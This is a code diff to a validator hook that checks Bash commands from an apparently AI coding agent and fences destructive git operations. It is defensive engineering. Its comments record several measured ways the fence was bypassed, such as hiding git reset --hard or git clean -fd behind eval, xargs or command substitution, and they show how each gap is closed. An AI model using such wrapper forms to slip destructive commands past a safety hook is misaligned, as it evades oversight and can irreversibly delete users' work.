+  // `eval "git reset --hard HEAD"` and `echo -fd | xargs git clean` each exited
+  // 0 with NO finding at all, while their plain spellings BLOCK — the identical
+  // wrapper-form gap measured in posture-gate's mutation fence, on the fence
+  // whose loss is IRRECOVERABLE (no reflog for unstaged or untracked files).
+  // Swept in the SAME change per security.md § Enforcement-Surface Parity.
+  //
+  // Used ONLY by the ORDER-INDEPENDENT lanes below (unresolvable-subcommand,
+  // reset --hard, clean -f, push --force, --no-verify). The `cd`-trail lane keeps
+  // its own quote-aware split: a nested body runs in a SUBSHELL and cannot move
+  // the parent shell's cwd, so splicing it into a directory trail would model a
+  // `cd` that never happens.
+  const segments = expandNestedSegments(rawSegments).segments;
+
+  // UNKNOWN SUBCOMMAND — fail CLOSED (loom#1549 F3 lock 8). A git invocation
+  // whose VERB is produced by a construct the hook must not evaluate
+  // (`git $(echo reset) --hard`, or a `$(a && b)` the raw splitter above cut in
+  // half) could be ANY verb, including the two fenced destructive ones. Every
+  // fence below dispatches on a literal `g.sub`, so an unknown verb matches
+  // none of them and the segment would fall through to a silent allow — the
+  // precise shape this fix exists to close.
+  //
+  // Disposition is copied, not invented: it is the one gitWorkingTreeStatus
+  // already takes for an unresolvable git binary ("Unresolvable git ranks
+  // TIGHTEST here … `ok:false` already routes the caller to halt-and-report
+  // rather than silent allow"). halt-and-report, not block, per
+  // hook-output-discipline.md MUST-2 — there is no structural dirty-tree
+  // measurement to justify `block` when the tree cannot even be identified.
+  for (const seg of segments) {
+    const g = parseGitInvocation(seg);
+    if (!g || g.unresolvable !== "subcommand") continue;
+    // loom#1606 instance 8 — DEFER and BREAK, never return. This lane fails
+    // CLOSED on an unresolvable verb, but returning here handed the whole
+    // command a non-blocking exit, so the two fences whose loss is
+    // IRRECOVERABLE never ran on the segments that WERE resolvable. MEASURED
+    // with a control on a tree carrying untracked files:
+    //   git clean -fd            (alone)  -> exit 2 BLOCK
+    //   git $(echo status) && <same>      -> exit 0 ALLOW
+    // `break` (not `continue`): one unresolved-verb report per command is
+    // enough, and the resolvable segments still reach every fence below.
+    deferredFindings.push({
+      severity: "halt-and-report",
+      what_happened: `Bash invoked git with a subcommand this hook cannot resolve: ${command.slice(0, 120)}`,
+      why: "git.md MUST 'Destructive Working-Tree Ops' — the subcommand is produced by a shell construct (command substitution, parameter expansion) the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval). The verb is therefore UNKNOWN and may be `reset --hard` or `clean -f`, so the destructive-op fence cannot clear it. Unresolvable ranks TIGHTEST at a fail-closed fence.",
+      agent_must_report: [
+        "State the literal git subcommand this command resolves to at runtime",
+        "Re-issue it with the subcommand written literally (`git reset …`, not `git $(…) …`) so the destructive-op fence can measure the target tree",
+      ],
+      agent_must_wait:
+        "Do not retry with the subcommand still hidden behind a substitution. Write the verb literally.",
+      user_summary:
+        "git subcommand hidden behind a shell substitution — cannot be fence-checked; write it literally",
+    });
+    break;
+  }
 
   // git reset --hard — STRUCTURAL severity (hook-output-discipline.md MUST-2:
   // `git status --porcelain` non-empty is the canonical structural signal that
@@ -1050,9 +1287,31 @@ function validateBashCommand(data) {
   for (const seg of segments) {
     const g = parseGitInvocation(seg);
     if (!g || g.sub !== "reset" || !/(^|\s)--hard\b/.test(g.args)) continue;
+    // UNRESOLVABLE TARGET TREE — fail CLOSED (loom#1549 F3 lock 8). The verb is
+    // known and destructive, but `-C`/`--work-tree` names a directory only the
+    // shell can produce. The porcelain probe below would spawn against the
+    // LITERAL `$(…)` bytes, which name no directory: `ok:false`, and the
+    // fail-OPEN contract then degrades this branch to a bare advisory. Halting
+    // here makes that outcome DELIBERATE rather than an artefact of a spawn
+    // that happened to fail — and it holds even if such a path ever resolved.
+    if (g.unresolvable === "dir") {
+      return withDeferred({
+        severity: "halt-and-report",
+        what_happened: `Bash invoked \`git reset --hard\` against a target directory this hook cannot resolve: ${command.slice(0, 120)}`,
+        why: "git.md MUST 'Destructive Working-Tree Ops MUST Verify Clean Working Tree' — the `-C`/`--work-tree` value comes from a shell construct the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval), so the tree `--hard` would discard cannot be measured. An unverifiable target ranks TIGHTEST at a fail-closed destructive-op fence.",
+        agent_must_report: [
+          "Name the directory the substitution resolves to, and show `git status --porcelain` for THAT directory",
+          "Re-issue with the path written literally so the fence can measure the tree, OR use `git reset --keep <ref>` (aborts on a dirty tree by itself)",
+        ],
+        agent_must_wait:
+          "Do not retry --hard while the target tree is unidentifiable. Write the path literally, or use --keep.",
+        user_summary:
+          "git reset --hard at a substituted -C path — target tree unverifiable (write the path literally or use --keep)",
+      });
+    }
     const st = gitWorkingTreeStatus(g.dir, cwd);
     if (st.ok && st.dirty) {
-      return {
+      return withDeferred({
         severity: "block",
         what_happened: `Bash invoked \`git reset --hard\` against a DIRTY working tree: ${command.slice(0, 120)}`,
         why: "git.md MUST 'Destructive Working-Tree Ops MUST Verify Clean Working Tree' — a dirty-tree --hard discards unstaged modifications AND untracked files with no reflog. Structural signal (`git status --porcelain` non-empty), per hook-output-discipline.md MUST-2.",
@@ -1065,9 +1324,9 @@ function validateBashCommand(data) {
           "Do not retry --hard while the tree is dirty. Use --keep, or stash/commit first.",
         user_summary:
           "git reset --hard blocked — DIRTY working tree (use --keep or stash first)",
-      };
+      });
     }
-    return {
+    return withDeferred({
       severity: "halt-and-report",
       what_happened: `Bash invoked \`git reset --hard\`: ${command.slice(0, 120)}`,
       why: "git.md MUST 'Destructive Working-Tree Ops' — prefer `git reset --keep` (aborts on a dirty tree). Tree appears clean or is unverifiable; surfacing per hook-output-discipline.md MUST-2 (no structural dirty-tree signal → not block).",
@@ -1078,7 +1337,7 @@ function validateBashCommand(data) {
       agent_must_wait:
         "Prefer --keep; proceed with --hard only after confirming the tree is clean.",
       user_summary: "git reset --hard — verify clean tree or use --keep",
-    };
+    });
   }
 
   // git clean -f[d] — STRUCTURAL severity. `git clean -f` deletes UNTRACKED-not-
@@ -1100,9 +1359,29 @@ function validateBashCommand(data) {
     const force =
       /(^|\s)-[a-zA-Z]*f[a-zA-Z]*\b/.test(a) || /(^|\s)--force\b/.test(a);
     if (!force) continue; // `git clean` without -f is a no-op
+    // UNRESOLVABLE TARGET TREE — fail CLOSED, same disposition as the
+    // `reset --hard` fence above (loom#1549 F3 lock 8). Sibling surface, swept
+    // in the SAME change per security.md § Enforcement-Surface Parity: fixing
+    // only the reset lane would leave `git -C $(…) clean -fd` reaching no
+    // guard, which is the identical measured bypass.
+    if (g.unresolvable === "dir") {
+      return withDeferred({
+        severity: "halt-and-report",
+        what_happened: `Bash invoked \`git clean\` with force against a target directory this hook cannot resolve: ${command.slice(0, 120)}`,
+        why: "git.md MUST 'Destructive Working-Tree Ops' — the `-C`/`--work-tree` value comes from a shell construct the hook MUST NOT evaluate (hook-output-discipline.md Rule 3 / security.md § no-eval), so the untracked files `clean -f` would delete cannot be enumerated. An unverifiable target ranks TIGHTEST at a fail-closed destructive-op fence.",
+        agent_must_report: [
+          "Name the directory the substitution resolves to, and show `git clean -n` (dry-run) for THAT directory",
+          "Re-issue with the path written literally so the fence can enumerate what would be deleted",
+        ],
+        agent_must_wait:
+          "Do not retry the force-clean while the target tree is unidentifiable. Dry-run against the literal path first.",
+        user_summary:
+          "git clean -f at a substituted -C path — target tree unverifiable (write the path literally and dry-run first)",
+      });
+    }
     const st = gitWorkingTreeStatus(g.dir, cwd);
     if (st.ok && st.untracked) {
-      return {
+      return withDeferred({
         severity: "block",
         what_happened: `Bash invoked \`git clean\` with force against a tree that HAS untracked files: ${command.slice(0, 120)}`,
         why: "git.md MUST 'Destructive Working-Tree Ops' — `git clean -f[d]` deletes untracked-not-ignored files irreversibly (no git object, no reflog; the #401 data-loss class). Structural signal (`git status --porcelain` shows `??` entries), per hook-output-discipline.md MUST-2.",
@@ -1115,9 +1394,9 @@ function validateBashCommand(data) {
           "Do not retry the clean while untracked work exists. Dry-run + stash first.",
         user_summary:
           "git clean -f blocked — untracked files present, would be deleted irreversibly",
-      };
+      });
     }
-    return {
+    return withDeferred({
       severity: "halt-and-report",
       what_happened: `Bash invoked \`git clean\` with force: ${command.slice(0, 120)}`,
       why: "git.md MUST 'Destructive Working-Tree Ops' — `git clean -f[d]` deletes untracked-not-ignored files. No untracked-not-ignored files detected (or unverifiable); surfacing per hook-output-discipline.md MUST-2.",
@@ -1129,7 +1408,7 @@ function validateBashCommand(data) {
         "Dry-run first if there is any chance of untracked work.",
       user_summary:
         "git clean -f — verify with dry-run (no untracked detected)",
-    };
+    });
   }
 
   // force-push to main/master — HALT-AND-REPORT (hook-output-discipline.md
@@ -1143,7 +1422,7 @@ function validateBashCommand(data) {
     const force = /(^|\s)--force(?:-with-lease)?\b/.test(g.args);
     const toMain = /(^|\s)(main|master)\b/.test(g.args);
     if (!force || !toMain) continue;
-    return {
+    return withDeferred({
       severity: "halt-and-report",
       what_happened: `Bash attempted force-push to a protected branch: ${command.slice(0, 120)}`,
       why: "git.md branch protection — main/master direct/force push is rejected server-side by GitHub; force-push rewrites history. Lexical signal → halt-and-report per hook-output-discipline.md MUST-2 (the server-side rejection is the structural defense).",
@@ -1155,12 +1434,12 @@ function validateBashCommand(data) {
         "Do not retry. Force-push to main requires explicit per-action user authorization.",
       user_summary:
         "force-push to main/master — requires explicit authorization",
-    };
+    });
   }
 
   // HALT-AND-REPORT: --no-verify (segment-anchored)
   if (segments.some((s) => /(?:^|\s)--no-verify\b/.test(s.trim()))) {
-    return {
+    return withDeferred({
       severity: "halt-and-report",
       what_happened: `Bash command uses --no-verify: ${command.slice(0, 120)}`,
       why: "git.md — pre-commit hooks exist for a reason; --no-verify requires explicit user instruction",
@@ -1172,7 +1451,7 @@ function validateBashCommand(data) {
       agent_must_wait:
         "Do not retry without explicit user instruction. Investigate hook failure root cause first.",
       user_summary: "--no-verify usage requires user authorization",
-    };
+    });
   }
 
   // Hot-path bounds for the stale-base-ref lane below. TWO limits, because either
@@ -1369,6 +1648,13 @@ function validateBashCommand(data) {
       }
       const g = parseGitInvocation(seg);
       if (!g || g.sub !== "worktree") continue;
+      // An unresolvable `-C` is an UNKNOWN directory, so this lane takes the
+      // disposition it already takes for one: do not probe (loom#1549 F3 lock
+      // 8). Probing the literal `$(…)` bytes would resolve some other path and
+      // report a CLEAN base ref for a tree never inspected — a false negative
+      // worse than no signal. `continue`, not `break`: only THIS segment's
+      // target is unknown, and the cd trail is still valid for later segments.
+      if (g.unresolvable === "dir") continue;
       // `-C` is absolute → it alone pins the repo, whatever the cd trail did.
       // Otherwise the resolved cd trail must be trustworthy, or we do not probe.
       const cAbs = g.dir && path.isAbsolute(g.dir);
@@ -1415,7 +1701,7 @@ function validateBashCommand(data) {
           ahead: stale.ahead,
         });
       } catch {}
-      return {
+      return withDeferred({
         severity: "halt-and-report",
         what_happened: `Bash invoked \`git worktree add\` from a STALE local base ref: ${stale.evidence}`,
         why:
@@ -1436,7 +1722,7 @@ function validateBashCommand(data) {
         agent_must_wait:
           "Do not create the worktree from the stale local ref. Re-issue against origin/<ref>, or state explicitly why the stale base is intended.",
         user_summary: `git worktree add from stale local ref \`${stale.ref}\` (${stale.behind} behind origin) — use origin/${stale.ref}`,
-      };
+      });
     }
   }
 
@@ -1487,12 +1773,12 @@ function validateBashCommand(data) {
         /env\s+/.test(command); // env prefix
 
       if (!loadsEnv && isPytest) {
-        return {
+        return withDeferred({
           continue: true,
           exitCode: 0,
           message:
             "REMINDER: .env exists but pytest may not load it. Consider: pytest-dotenv plugin OR prefix with env vars from .env. OPENAI_API_KEY and model settings are in .env!",
-        };
+        });
       }
     }
   }
@@ -1516,35 +1802,43 @@ function validateBashCommand(data) {
 
   for (const pattern of longRunningPatterns) {
     if (pattern.test(command) && !inTmux && !isBackground) {
-      return {
+      return withDeferred({
         continue: true,
         exitCode: 0,
         message:
           "WARNING: Long-running command. Consider using run_in_background or tmux.",
-      };
+      });
     }
   }
 
   // WARN: Git push - reminder for security review
   if (/git\s+push/.test(command)) {
-    return {
+    return withDeferred({
       continue: true,
       exitCode: 0,
-      message: "REMINDER: Did you run security-reviewer before pushing?",
-    };
+      message: withScopeAdvisory(
+        "REMINDER: Did you run security-reviewer before pushing?",
+      ),
+    });
   }
 
   // WARN: Git commit - reminder for review.
   // loom#1368: this site carried NO boundary at all, so it matched every
   // `git commit-*` sub-command (and `git commitfoo`). Anchored with the same
   // `(?![\w-])` negative lookahead as the two delegation sites above.
-  if (/\bgit\s+commit(?![\w-])/.test(command)) {
-    return {
+  // loom#1549 HIGH-3 — `\b`-anchored rather than `^`, so this one was not blind
+  // to wrapped/retargeted commits, but it was still substring matching: it fires
+  // on `git log --grep=commit` and on a `commit` inside a trailing shell comment.
+  // The shared parser dispatches on the SUBCOMMAND POSITION, which is the only
+  // thing that distinguishes those structurally.
+  if (findCommitInvocation(command)) {
+    return withDeferred({
       continue: true,
       exitCode: 0,
-      message:
+      message: withScopeAdvisory(
         "REMINDER: Code review completed? Consider delegating to reviewer.",
-    };
+      ),
+    });
   }
 
   // Log cargo test / cargo clippy observations for Rust repos
@@ -1568,7 +1862,13 @@ function validateBashCommand(data) {
     } catch {}
   }
 
-  return { continue: true, exitCode: 0, message: "Validated" };
+  // loom#1606 — the clean exit is the LAST of several non-blocking exits that
+  // can carry the deferred advisory, not the only one (see withScopeAdvisory).
+  return withDeferred({
+    continue: true,
+    exitCode: 0,
+    message: withScopeAdvisory("Validated"),
+  });
 }
 
 /**
